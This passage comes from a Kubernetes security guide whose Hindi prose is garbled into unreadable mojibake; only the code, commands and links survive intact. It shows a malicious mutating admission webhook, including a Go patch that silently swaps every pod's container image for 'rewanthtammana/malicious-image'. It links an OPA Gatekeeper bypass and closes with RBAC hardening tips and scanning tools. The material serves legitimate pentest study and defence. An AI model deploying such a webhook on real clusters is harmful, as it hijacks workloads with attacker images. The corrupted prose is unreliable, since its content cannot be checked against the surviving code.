рдЬрдм рдЖрдк `ErrImagePull` рддреНрд░реБрдЯрд┐ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрдореЗрдЬ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐рд╕реА рднреА рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рдХреА рдЫрд╡рд┐ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдордиреЗ рдЫрд╡рд┐ `nginx` рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рд▓реЗрдХрд┐рди рдЕрдВрддрд┐рдо рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдИ рдЧрдИ рдЫрд╡рд┐ `rewanthtammana/malicious-image` рд╣реИред рдХреНрдпрд╛ рд╣реЛ рдЧрдпрд╛!!

#### рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ mutating webhook admission controller рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЕрдкрдиреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд▓рд╛рдЗрдиреЛрдВ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рд░реВрдк рдореЗрдВ Kubernetes API рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣ред рдЬрд┐рд╕рд╕реЗ рджреЗрдЦреЗ рдЧрдП рдкрд░рд┐рдгрд╛рдо рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## OPA рдЧреЗрдЯрдХреАрдкрд░ рдмрд╛рдпрдкрд╛рд╕

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## рд╕рд░реНрд╡реЛрддреНрддрдо рдкреНрд░рдерд╛рдПрдБ

### **рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдХрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдорд╛рдЙрдВрдЯ рдЕрдХреНрд╖рдо рдХрд░рдирд╛**

* **рдкреЙрдбреНрд╕ рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдкреЙрдбреНрд╕ рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдорд╛рдЙрдВрдЯ рдХрд░рддреЗ рд╣реИрдВред рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, Kubernetes рдЗрд╕ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдорд╛рдЙрдВрдЯ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВ**: Kubernetes рд╕рдВрд╕реНрдХрд░рдг 1.6 рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдпрд╛ рдкреЙрдбреНрд╕ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ `automountServiceAccountToken: false` рд╕реЗрдЯ рдХрд░реЗрдВред

### **RoleBindings/ClusterRoleBindings рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░**

* **рдЪрдпрдирд╛рддреНрдордХ рд╕рдорд╛рд╡реЗрд╢**: рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреЗрд╡рд▓ рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ RoleBindings рдпрд╛ ClusterRoleBindings рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрд╕рдВрдЧрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛рдПрдВ рддрд╛рдХрд┐ рдХрдбрд╝реА рд╕реБрд░рдХреНрд╖рд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред

### **рдиреЗрдорд╕реНрдкреЗрд╕-рд╡рд┐рд╢рд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛рдПрдБ рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рдКрдкрд░**

* **рднреВрдорд┐рдХрд╛рдПрдБ рдмрдирд╛рдо рдХреНрд▓рд╕реНрдЯрд░-рднреВрдорд┐рдХрд╛рдПрдБ**: рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА рд▓рд╛рдЧреВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рднреВрдорд┐рдХрд╛рдУрдВ рдФрд░ ClusterRoleBindings рдХреА рдмрдЬрд╛рдп рдиреЗрдорд╕реНрдкреЗрд╕-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП Roles рдФрд░ RoleBindings рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рджрд╛рдпрд░рд╛ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред

### **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **рд╕рдВрджрд░реНрдн**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
